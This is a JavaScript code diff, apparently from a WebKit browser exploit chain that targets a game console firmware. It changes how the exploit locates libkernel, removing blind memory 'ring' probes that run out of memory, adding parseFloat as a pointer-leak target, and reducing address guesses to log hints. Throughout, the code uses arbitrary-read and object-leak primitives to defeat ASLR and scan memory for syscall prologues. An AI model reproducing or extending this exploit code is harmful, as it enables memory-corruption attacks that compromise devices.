@@ -30,7 +30,8 @@ const PF_X = 1;
 const LK_LOW_TEXT_MAX = 0x200000;
 const LK_ELF_RADIUS = 0x4000000n;
 const LK_HUNT_RADIUS = 0x2000000n;
-const LK_RING_RADIUS = 0x8000000n;
+/** Ring removed from lite path — blind page reads beyond ±32MB OOM on 13.52 HW. */
+const LK_RING_RADIUS = LK_HUNT_RADIUS;
 const LK_HDR_BACK_COARSE = 64;
 const LK_HDR_BACK_FINE = 256;
 
@@ -986,13 +987,16 @@ function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
         try {
             targets.push({ label: "expm1", cell: p.leakval(Math.expm1) });
         } catch (_) { }
+        try {
+            targets.push({ label: "parseFloat", cell: p.leakval(parseFloat) });
+        } catch (_) { }
         if (!targets.length)
             return { done: true, lk: null, state: null, phase: "leak-empty" };
         state = { targets, tIdx: 0, slotOff: 0, tried: 0 };
         return { done: false, state, phase: "leak-start", targets: targets.length };
     }
 
-    const SLOT_MAX = 0x80;
+    const SLOT_MAX = 0x100;
     let batch = 0;
     while (state.tIdx < state.targets.length && batch < 4) {
         const t = state.targets[state.tIdx];
@@ -1026,63 +1030,37 @@ function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
     return { done: false, state, phase: "leak", tried: state.tried, target: state.tIdx };
 }
 
-/** 2-read probe of estimateLibkernelCandidates — logs OOM vs prologue vs other. */
-export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
+/** Log-only — never reads (blind module probes OOM on 13.52). */
+export function showLibkernelGuesses(webkitBase, nativeFn, log) {
     log = log || (() => {});
+    log("LK-GUESS-HINT", "blind address reads OOM — paste ptr from cal vtable instead");
     const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
-    const out = [];
-    for (let i = 0; i < cands.length; i++) {
-        const c = cands[i];
-        let addr;
-        try {
-            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
-        } catch (_) {
-            addr = null;
-        }
-        if (!addr) {
-            out.push({ hex: c.hex, why: c.why, status: "bad-hex" });
-            continue;
-        }
-        const w0 = read4p(p, addr);
-        const w1 = read4p(p, addr.add32(4));
-        if (w0 == null) {
-            log("LK-PROBE-GUESS", c.hex + " UNREAD (" + c.why + ")");
-            out.push({ hex: c.hex, why: c.why, status: "unread" });
-            continue;
-        }
-        const prologue = (w0 & 0xff) === 0xb8 && w1 != null && (w1 & 0xffff) === 0x050f;
-        if (prologue && isLibkernelPrologue(p, addr)) {
-            saveLibkernelSession(addr, null);
-            log("LK-PROBE-OK", c.hex + " prologue HIT (" + c.why + ")");
-            out.push({ hex: c.hex, why: c.why, status: "hit", lk: addr });
-            return { ok: true, lk: addr, why: c.why, tried: out };
-        }
-        log("LK-PROBE-GUESS", c.hex + " w0=" + fmtMagic(w0)
-            + (w1 != null ? " w1=" + fmtMagic(w1) : " w1=null")
-            + " (" + c.why + ")");
-        out.push({ hex: c.hex, why: c.why, status: "miss", w0, w1 });
-    }
-    return { ok: false, tried: out };
+    for (let i = 0; i < cands.length; i++)
+        log("LK-GUESS", cands[i].hex + " (" + cands[i].why + ") — DO NOT read, paste cal ptr");
+    return { ok: false, cands };
 }
 
-/** Guess bases from webkit ASLR — try paste or ring probe. */
+/** @deprecated blind reads OOM — use showLibkernelGuesses */
+export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
+    return showLibkernelGuesses(webkitBase, nativeFn, log);
+}
+
+/** Chunked leakval scan — reads heap slots only, follows ext code ptrs (OOM-safe). */
+export function scanLibkernelLeakChunk(p, webkitBase, off, state, retain) {
+    return scanLeakExtPtrChunk(p, webkitBase, off, state, retain);
+}
+
+/** Guess bases for log/paste hints only — not for blind reads. */
 export function estimateLibkernelCandidates(webkitBase, nativeFn) {
     const out = [];
     if (!webkitBase) return out;
     const wb = ptrBig(webkitBase);
     const aligned = wb & ~0x3fffn;
-    const deltas = [
-        0x800000, 0x1000000, 0x2000000, 0x4000000, 0x8000000, 0xc000000,
-    ];
+    // libkernel usually below webkit — list negatives only (no blind +128MB probes)
+    const deltas = [0x800000, 0x1000000, 0x2000000];
     for (let i = 0; i < deltas.length; i++) {
         const d = BigInt(deltas[i]);
         out.push({ hex: "0x" + (aligned - d).toString(16), why: "wk-" + deltas[i].toString(16) });
-        out.push({ hex: "0x" + (aligned + d).toString(16), why: "wk+" + deltas[i].toString(16) });
-    }
-    if (nativeFn) {
-        const na = ptrBig(nativeFn) & ~0x3fffn;
-        out.push({ hex: "0x" + (na - 0x1000000n).toString(16), why: "nativeFn-16MB" });
-        out.push({ hex: "0x" + (na + 0x1000000n).toString(16), why: "nativeFn+16MB" });
     }
     return out;
 }
@@ -2171,13 +2149,15 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
         }
         if (c.done) {
             const st = state.pltStats || {};
-            state.stage = "ring";
+            state.nearPages = c.pages;
+            state.nearHits = c.hits;
+            state.stage = "leak";
             state.sub = null;
             state.pltStats = st;
             return {
                 done: false,
                 state,
-                phase: "ring-next",
+                phase: "leak-next",
                 nearPages: c.pages,
                 nearHits: c.hits,
                 ff25: st.ff25,
@@ -2188,48 +2168,8 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
         return Object.assign({ state }, c);
     }
 
-    if (state.stage === "ring") {
-        const c = scanLkPrologueRingChunk(p, off, state.sub, state.anchors);
-        state.sub = c.state;
-        if (c.done && c.lk) {
-            return Object.assign({ state }, c);
-        }
-        if (c.done) {
-            state.stage = "leak";
-            state.sub = null;
-            state.ringProbes = c.probes;
-            return {
-                done: false,
-                state,
-                phase: "leak-next",
-                ringProbes: c.probes,
-            };
-        }
-        return Object.assign({ state }, c);
-    }
-
     if (state.stage === "leak") {
         const c = scanLeakExtPtrChunk(p, webkitBase, off, state.sub, opts.retain);
-        state.sub = c.state;
-        if (c.done && c.lk) {
-            return Object.assign({ state }, c);
-        }
-        if (c.done) {
-            state.stage = "guess";
-            state.sub = null;
-            state.leakTried = c.tried;
-            return {
-                done: false,
-                state,
-                phase: "guess-next",
-                leakTried: c.tried,
-            };
-        }
-        return Object.assign({ state }, c);
-    }
-
-    if (state.stage === "guess") {
-        const c = scanGuessCandidatesChunk(p, webkitBase, opts.nativeFn, state.sub);
         state.sub = c.state;
         if (c.done && c.lk) {
             return Object.assign({ state }, c);
@@ -2245,9 +2185,9 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
                 ff25: st.ff25,
                 gotHigh: st.gotHigh,
                 e8ext: st.e8ext,
-                ringProbes: state.ringProbes,
-                leakTried: state.leakTried,
-                guessTried: c.tried,
+                nearPages: state.nearPages,
+                nearHits: state.nearHits,
+                leakTried: c.tried,
             };
         }
         return Object.assign({ state }, c);
